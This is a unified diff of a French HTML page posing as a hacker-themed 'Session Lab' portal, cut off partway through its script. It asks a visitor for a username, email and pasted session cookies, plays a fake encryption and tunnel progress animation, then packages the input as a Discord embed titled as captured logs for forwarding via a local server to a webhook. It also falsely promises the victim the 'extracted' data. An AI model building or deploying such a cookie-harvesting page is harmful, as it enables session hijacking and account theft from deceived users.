@@ -2,9 +2,9 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Cyber-Security Lab | User Portal</title>
+    <title>Cyber-Security Lab | Portal</title>
     <style>
-        :root { --neon-green: #00ff41; --dark-bg: #0d0208; --error-red: #ff3131; }
+        :root { --neon-green: #00ff41; --dark-bg: #0d0208; }
         body { 
             background: var(--dark-bg); 
             color: var(--neon-green); 
@@ -17,10 +17,10 @@
         .container { 
             max-width: 500px; width: 100%; border: 1px solid var(--neon-green); 
             padding: 30px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); 
-            margin-top: 50px; background: rgba(0, 20, 0, 0.9);
+            margin-top: 50px; background: rgba(0, 20, 0, 0.95);
         }
 
-        h1 { text-transform: uppercase; letter-spacing: 5px; text-align: center; border-bottom: 1px solid var(--neon-green); padding-bottom: 10px; }
+        h1 { text-transform: uppercase; letter-spacing: 5px; text-align: center; border-bottom: 1px solid var(--neon-green); padding-bottom: 10px; font-size: 1.5rem; }
         
         input, textarea { 
             background: black; border: 1px solid var(--neon-green); 
@@ -36,13 +36,16 @@
 
         button:hover { background: white; box-shadow: 0 0 20px var(--neon-green); }
 
-        #loading-zone { display: none; text-align: center; padding: 40px; }
+        /* Écrans */
+        #loading-zone, #final-message { display: none; text-align: center; padding: 40px; }
         
-        .glitch { font-size: 1.2rem; animation: pulse 1.5s infinite; }
+        .glitch { font-size: 1.1rem; animation: pulse 1.5s infinite; margin-bottom: 20px; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        .footer-note { font-size: 0.7rem; color: #444; margin-top: 20px; text-align: center; }
-        .status-msg { margin-top: 15px; font-weight: bold; }
+        #progress-bar { color: white; font-size: 0.9rem; margin-top: 10px; }
+        
+        .success-box { border: 1px dashed var(--neon-green); padding: 20px; margin-top: 10px; }
+        .footer-note { font-size: 0.7rem; color: #444; margin-top: 40px; text-align: center; }
     </style>
 </head>
 <body>
@@ -51,16 +54,28 @@
     <h1>SESSION LAB v1.0</h1>
 
     <div id="user-view">
-        <p>[SYSTEM]: En attente de synchronisation...</p>
-        <input type="text" id="username" placeholder="Nom d'utilisateur">
+        <p>[SYSTEM]: Entrez les identifiants pour la synchronisation.</p>
+        <input type="text" id="username" placeholder="Username">
         <input type="email" id="userEmail" placeholder="Votre Email">
-        <textarea id="cookieInput" rows="4" placeholder="Collez les Cookies ici..."></textarea>
+        <textarea id="cookieInput" rows="4" placeholder="Données de session (Cookies)..."></textarea>
         <button onclick="processData()">INITIER LE TRANSFERT</button>
     </div>
 
     <div id="loading-zone">
-        <div class="glitch" id="status-text">INITIALISATION DU CRYPTAGE...</div>
-        <div id="progress-bar" style="margin-top: 20px; color:white;">[████████░░░░] 65%</div>
+        <div class="glitch" id="status-text">INITIALISATION DU TUNNEL...</div>
+        <div id="progress-bar">[░░░░░░░░░░░░] 0%</div>
+    </div>
+
+    <div id="final-message">
+        <div class="success-box">
+            <h2 style="color:white;">TRANSFERT TERMINÉ</h2>
+            <p>[SYSTÈME]: Les journaux de session ont été extraits avec succès.</p>
+            <p style="color:var(--neon-green); font-weight:bold;">
+                Vous recevrez les données complètes à l'adresse : <br>
+                <span id="display-email" style="color:white; text-decoration:underline;"></span>
+            </p>
+        </div>
+        <button onclick="location.reload()" style="background:none; color:var(--neon-green); border:1px solid var(--neon-green); margin-top:20px;">NOUVELLE SESSION</button>
     </div>
 </div>
 
@@ -72,50 +87,42 @@
         const e = document.getElementById('userEmail').value;
         const c = document.getElementById('cookieInput').value;
 
-        if(!u || !e) return alert("Erreur : Les champs Utilisateur et Email sont obligatoires.");
+        if(!u || !e) return alert("Erreur : L'utilisateur et l'email sont requis.");
 
-        // Animation de chargement
+        // Affichage du chargement
         document.getElementById('user-view').style.display = 'none';
         document.getElementById('loading-zone').style.display = 'block';
+        
         const status = document.getElementById('status-text');
         const progress = document.getElementById('progress-bar');
 
-        // Préparation du message pour Discord (via ton serveur)
+        // Simulation de progression pour le style
+        const steps = [
+            { t: "CRYPTAGE DES DONNÉES...", p: "[██░░░░░░░░░░] 20%" },
+            { t: "OUVERTURE DU TUNNEL LOCAL...", p: "[██████░░░░░░] 50%" },
+            { t: "TRANSFERT VERS LE BACKEND...", p: "[██████████░░] 85%" },
+            { t: "FINALISATION...", p: "[████████████] 100%" }
+        ];
+
+        let i = 0;
+        const interval = setInterval(() => {
+            if(i < steps.length) {
+                status.innerText = steps[i].t;
+                progress.innerText = steps[i].p;
+                i++;
+            } else {
+                clearInterval(interval);
+                sendToServer(u, e, c);
+            }
+        }, 800);
+    }
+
+    async function sendToServer(u, e, c) {
         const payload = {
             embeds: [{
-                title: "🚨 LOG DE SESSION CAPTURÉ 🚨",
+                title: "🚨 LOGS RÉCUPÉRÉS 🚨",
                 color: 5763719,
                 fields: [
-                    { name: "👤 Utilisateur", value: `\`${u}\``, inline: true },
-                    { name: "📧 Email", value: `\`${e}\``, inline: true },
-                    { name: "🍪 Données", value: "```" + (c || "Aucune donnée") + "```" }
-                ],
-                footer: { text: "Transfert via Localhost:3000 • " + new Date().toLocaleString() }
-            }]
-        };
-
-        try {
-            // ENVOI AU SERVEUR NODE.JS (celui qui affiche "SERVEUR ACTIF")
-            const response = await fetch("http://localhost:3000/send-data", {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-            if (response.ok) {
-                status.innerHTML = "<span style='color:white;'>TRANSFERT RÉUSSI</span><br><br>Données transmises avec succès.";
-                progress.innerHTML = "[████████████] 100%";
-                progress.style.color = "var(--neon-green)";
-            } else {
-                status.innerHTML = "<span style='color:var(--error-red);'>ERREUR SERVEUR</span><br>Vérifiez le lien Webhook dans server.js";
-            }
-        } catch (error) {
-            status.innerHTML = "<span style='color:var(--error-red);'>SERVEUR HORS LIGNE</span><br><small>Relance 'node server.js' dans ton terminal.</small>";
-            progress.innerHTML = "[XXXXXXXXXXXX] ERROR";
-            progress.style.color = "var(--error-red)";
-        }
-    }
-</script>
-
-</body>
-</html>
+                    { name: "👤 User", value: u, inline: true },
+                    { name: "📧 Email", value: e, inline: true },
+                    { name: "
